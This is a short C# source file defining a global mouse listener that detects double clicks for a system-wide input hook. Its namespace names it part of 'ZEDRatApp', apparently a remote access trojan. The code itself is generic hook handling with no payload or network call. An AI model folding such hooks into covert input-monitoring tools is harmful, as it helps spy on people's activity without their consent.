using System.Drawing;
using System.Windows.Forms;
using ZEDRatApp.ZEDRAT.MouseKeyHook.WinApi;

namespace ZEDRatApp.ZEDRAT.MouseKeyHook.Implementation
{
	internal class GlobalMouseListener : MouseListener
	{
		private readonly int m_SystemDoubleClickTime;

		private MouseButtons m_PreviousClicked;

		private Point m_PreviousClickedPosition;

		private int m_PreviousClickedTime;

		public GlobalMouseListener()
			: base(new Subscribe(HookHelper.HookGlobalMouse))
		{
			this.m_SystemDoubleClickTime = MouseNativeMethods.GetDoubleClickTime();
		}

		protected override void ProcessDown(ref MouseEventExtArgs e)
		{
			if (this.IsDoubleClick(e))
			{
				e = e.ToDoubleClickEventArgs();
			}
			base.ProcessDown(ref e);
		}

		protected override void ProcessUp(ref MouseEventExtArgs e)
		{
			base.ProcessUp(ref e);
			if (e.Clicks == 2)
			{
				this.StopDoubleClickWaiting();
			}
			if (e.Clicks == 1)
			{
				this.StartDoubleClickWaiting(e);
			}
		}

		private void StartDoubleClickWaiting(MouseEventExtArgs e)
		{
			this.m_PreviousClicked = e.Button;
			this.m_PreviousClickedTime = e.Timestamp;
			this.m_PreviousClickedPosition = e.Point;
		}

		private void StopDoubleClickWaiting()
		{
			this.m_PreviousClicked = MouseButtons.None;
			this.m_PreviousClickedTime = 0;
			this.m_PreviousClickedPosition = new Point(0, 0);
		}

		private bool IsDoubleClick(MouseEventExtArgs e)
		{
			if (e.Button == this.m_PreviousClicked && e.Point == this.m_PreviousClickedPosition)
			{
				return e.Timestamp - this.m_PreviousClickedTime <= this.m_SystemDoubleClickTime;
			}
			return false;
		}

		protected override MouseEventExtArgs GetEventArgs(CallbackData data)
		{
			return MouseEventExtArgs.FromRawDataGlobal(data);
		}
	}
}
